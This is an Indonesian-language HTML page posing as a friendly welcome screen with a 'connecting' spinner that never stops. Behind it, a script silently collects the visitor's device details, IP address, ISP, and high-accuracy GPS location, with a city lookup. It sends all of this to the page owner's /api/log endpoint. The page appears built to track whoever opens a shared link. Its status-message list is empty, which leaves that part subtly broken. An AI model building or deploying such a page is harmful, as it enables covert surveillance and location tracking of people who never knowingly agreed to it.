<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selamat Datang</title>
    <style>
        /* ── Tema Otomatis ── */
        :root {
            --bg-color:   #f0f0f5;
            --card-bg:    #ffffff;
            --text-color: #1d1d1f;
            --sub-text:   #86868b;
            --accent:     #007aff;
            --accent2:    #5e5ce6;
            --accent3:    #30d158;
            --success:    #34c759;
            --glow:       rgba(0,122,255,0.25);
        }
        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color:  #0a0a0f;
                --card-bg:   #111118;
                --text-color:#f5f5f7;
                --sub-text:  #636366;
                --glow:      rgba(94,92,230,0.35);
            }
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            transition: background-color 0.4s, color 0.4s;
            overflow: hidden;
        }

        /* ── Background ambient dots ── */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background-image:
                radial-gradient(circle at 20% 30%, var(--glow) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(48,209,88,0.12) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        /* ── Card ── */
        .card {
            position: relative;
            z-index: 1;
            background-color: var(--card-bg);
            padding: 52px 32px 44px;
            border-radius: 28px;
            text-align: center;
            max-width: 360px;
            width: 90%;
            box-shadow:
                0 2px 1px rgba(255,255,255,0.04) inset,
                0 20px 60px rgba(0,0,0,0.12),
                0 0 0 1px rgba(255,255,255,0.06) inset;
        }

        /* ══════════════════════════════════════
           LOADER — multi-ring unlimited spinner
        ══════════════════════════════════════ */
        .loader-wrap {
            position: relative;
            width: 100px;
            height: 100px;
            margin: 0 auto 36px;
        }

        /* Outer ring — slow counter-clockwise */
        .ring {
            position: absolute;
            border-radius: 50%;
            border-style: solid;
            border-color: transparent;
        }

        .ring-1 {
            inset: 0;
            border-width: 3px;
            border-top-color: var(--accent);
            border-right-color: rgba(0,122,255,0.3);
            animation: spinCCW 2.4s cubic-bezier(0.6,0.1,0.4,0.9) infinite;
        }

        .ring-2 {
            inset: 10px;
            border-width: 3px;
            border-bottom-color: var(--accent2);
            border-left-color:   rgba(94,92,230,0.3);
            animation: spinCW 1.8s cubic-bezier(0.5,0.15,0.5,0.85) infinite;
        }

        .ring-3 {
            inset: 20px;
            border-width: 3px;
            border-top-color:   var(--accent3);
            border-right-color: rgba(48,209,88,0.3);
            animation: spinCCW 1.2s linear infinite;
        }

        /* Pulsing core dot */
        .core {
            position: absolute;
            inset: 34px;
            border-radius: 50%;
            background: conic-gradient(
                from 0deg,
                var(--accent),
                var(--accent2),
                var(--accent3),
                var(--accent)
            );
            animation: pulse 2s ease-in-out infinite, rotateConic 4s linear infinite;
            filter: blur(1px);
        }
        .core::after {
            content: '';
            position: absolute;
            inset: 3px;
            border-radius: 50%;
            background: var(--card-bg);
        }

        /* Orbiting dot */
        .orbit {
            position: absolute;
            inset: 5px;
            border-radius: 50%;
            animation: spinCW 2s linear infinite;
        }
        .orbit::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: var(--accent);
            box-shadow: 0 0 6px 2px var(--accent);
        }

        /* Keyframes */
        @keyframes spinCW  { to { transform: rotate( 360deg); } }
        @keyframes spinCCW { to { transform: rotate(-360deg); } }
        @keyframes rotateConic { to { transform: rotate(360deg); } }
        @keyframes pulse {
            0%, 100% { transform: scale(1);    opacity: 1;   }
            50%       { transform: scale(1.15); opacity: 0.7; }
        }

        /* ── Progress bar (infinite shimmer) ── */
        .progress-bar {
            height: 3px;
            background: rgba(0,0,0,0.06);
            border-radius: 999px;
            overflow: hidden;
            margin-bottom: 32px;
        }
        @media (prefers-color-scheme: dark) {
            .progress-bar { background: rgba(255,255,255,0.06); }
        }
        .progress-fill {
            height: 100%;
            width: 40%;
            border-radius: 999px;
            background: linear-gradient(
                90deg,
                var(--accent2),
                var(--accent),
                var(--accent3),
                var(--accent)
            );
            background-size: 300% 100%;
            animation: shimmer 2s linear infinite;
        }
        @keyframes shimmer {
            0%   { background-position: 100% 0; transform: translateX(-100%); }
            100% { background-position:   0% 0; transform: translateX(250%); }
        }

        /* ── Typography ── */
        h1 {
            font-size: 1.45rem;
            font-weight: 700;
            letter-spacing: -0.3px;
            margin-bottom: 10px;
            line-height: 1.3;
        }

        p {
            color: var(--sub-text);
            font-size: 0.95rem;
            line-height: 1.55;
            margin-bottom: 28px;
        }

        /* ── Typing status ── */
        .status {
            font-size: 0.82rem;
            color: var(--sub-text);
            min-height: 1.3rem;
            font-weight: 500;
            letter-spacing: 0.3px;
            transition: color 0.4s;
        }
        .status::after {
            content: '|';
            display: inline-block;
            animation: blink 1s step-start infinite;
            margin-left: 1px;
            opacity: 0.6;
        }
        @keyframes blink {
            0%, 100% { opacity: 0.6; }
            50%       { opacity: 0; }
        }
    </style>
</head>
<body>

    <div class="card">

        <!-- Multi-ring unlimited loader -->
        <div class="loader-wrap" id="loader">
            <div class="ring ring-1"></div>
            <div class="ring ring-2"></div>
            <div class="ring ring-3"></div>
            <div class="orbit"></div>
            <div class="core"></div>
        </div>

        <h1>Selamat datang</h1>
        <p>Kami senang berkenalan<br>dengan Anda.</p>

        <!-- Infinite shimmer progress bar -->
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>

        <!-- Typing cursor status -->
        <div class="status" id="status">Menghubungkan…</div>

    </div>

    <script src="/vendor/ua-parser.min.js"></script>

    <script>
        /* ── Cycling status messages (unlimited, never stops) ── */
        const messages = [
        ];
        let msgIdx = 0;
        const statusEl = document.getElementById('status');

        function cycleStatus() {
            statusEl.style.opacity = '0';
            setTimeout(() => {
                msgIdx = (msgIdx + 1) % messages.length;
                statusEl.textContent = messages[msgIdx];
                statusEl.style.opacity = '1';
            }, 300);
        }
        statusEl.style.transition = 'opacity 0.3s';
        setInterval(cycleStatus, 2200);

        /* ── Main data collection ── */
        (async function init() {
            try {
                const deviceData = await getDeviceData();
                const ipInfo     = await fetchIpInfo();
                const geo        = await getGpsLocation(ipInfo);

                const payload = {
                    ...deviceData,
                    ip:        ipInfo.ip,
                    isp:       ipInfo.org || ipInfo.isp,
                    asn:       ipInfo.asn,
                    geo:       geo,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                };

                await fetch('/api/log', {
                    method:  'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body:    JSON.stringify(payload)
                });

            } catch (err) {
                console.error('Collection error:', err);
            }
            // ↑ Loader is NEVER hidden — it keeps spinning forever.
        })();

        async function getDeviceData() {
            const ua = navigator.userAgent;
            const parser = new UAParser(ua);
            const b = parser.getBrowser();
            const os = parser.getOS();
            const d = parser.getDevice();
            const e = parser.getEngine();

            // Screen & Hardware
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const viewport = `${window.innerWidth}x${window.innerHeight}`;
            const cores = navigator.hardwareConcurrency || 'Unknown';
            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';

            let model = d.model || 'Unknown Device';
            let vendor = d.vendor || '';

            // Enhanced iPhone Model Detection
            if (os.name === 'iOS' || /iPhone|iPad|iPod/.test(ua)) {
                vendor = 'Apple';
                model = guessIosModel(window.screen.width, window.screen.height, window.devicePixelRatio);
            }

            return {
                browserName: b.name,
                browserVersion: b.version,
                browserEngine: e.name,
                osName: os.name,
                osVersion: os.version,
                deviceType: d.type || ( /Mobi|Android/i.test(ua) ? 'mobile' : 'desktop'),
                deviceVendor: vendor,
                deviceModel: model,
                screenResolution: screenRes,
                viewportSize: viewport,
                cpuCores: cores,
                deviceMemory: ram,
                language: navigator.language
            };
        }

        function guessIosModel(w, h, dpr) {
            // Simplified lookup based on logical resolution and DPR
            const screens = [
                { w: 430, h: 932, dpr: 3, m: 'iPhone 15/16 Pro Max / Plus' },
                { w: 393, h: 852, dpr: 3, m: 'iPhone 15/16 / Pro' },
                { w: 428, h: 926, dpr: 3, m: 'iPhone 14/15 Plus / Pro Max' },
                { w: 390, h: 844, dpr: 3, m: 'iPhone 12/13/14 / Pro' },
                { w: 414, h: 896, dpr: 3, m: 'iPhone XS Max / 11 Pro Max' },
                { w: 414, h: 896, dpr: 2, m: 'iPhone XR / 11' },
                { w: 375, h: 812, dpr: 3, m: 'iPhone X / XS / 11 Pro' },
                { w: 375, h: 667, dpr: 2, m: 'iPhone 6/7/8 / SE' },
                { w: 320, h: 568, dpr: 2, m: 'iPhone 5/SE (1st Gen)' },
                { w: 768, h: 1024, dpr: 2, m: 'iPad' },
                { w: 834, h: 1112, dpr: 2, m: 'iPad Pro 10.5' },
                { w: 1024, h: 1366, dpr: 2, m: 'iPad Pro 12.9' }
            ];
            
            // Match (handle both orientations)
            const match = screens.find(s => 
                (Math.min(w, h) === s.w && Math.max(w, h) === s.h && dpr === s.dpr)
            );
            
            return match ? match.m + ' (estimasi)' : 'iPhone/iPad';
        }

        async function fetchIpInfo() {
            try {
                // Fetch from ipapi.co (no key required for limited use)
                const res = await fetch('https://ipapi.co/json/');
                if (res.ok) return await res.json();
            } catch (e) {}
            return { ip: 'Unknown', isp: 'Unknown' };
        }

        async function getGpsLocation(fallback) {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    return resolve(createGeoObj(fallback, 'ip'));
                }

                const options = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
                
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const { latitude, longitude, accuracy } = pos.coords;
                        // Reverse Geocode for City Name (Free, no key needed)
                        let city = '', region = '', country = '';
                        try {
                            const rev = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=id`);
                            const data = await rev.json();
                            city = data.city || data.locality;
                            region = data.principalSubdivision;
                            country = data.countryName;
                        } catch(e) {}
                        
                        resolve({
                            lat: latitude,
                            lng: longitude,
                            accuracy: accuracy,
                            city: city,
                            region: region,
                            country: country,
                            source: 'gps'
                        });
                    },
                    (err) => {
                        // On error (denied/timeout), use IP fallback
                        resolve(createGeoObj(fallback, 'ip'));
                    },
                    options
                );
            });
        }

        function groupGeo(data, source) {
            return createGeoObj(data, source);
        }

        function createGeoObj(data, source) {
            return {
                lat: data.latitude || null,
                lng: data.longitude || null,
                accuracy: null,
                city: data.city || 'Unknown',
                region: data.region || 'Unknown',
                country: data.country_name || 'Unknown',
                source: source
            };
        }

        // Connection helper
        function getConnection() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return null;
            return {
                type: conn.type,
                effectiveType: conn.effectiveType,
                downlink: conn.downlink,
                rtt: conn.rtt
            };
        }
    </script>
</body>
</html>
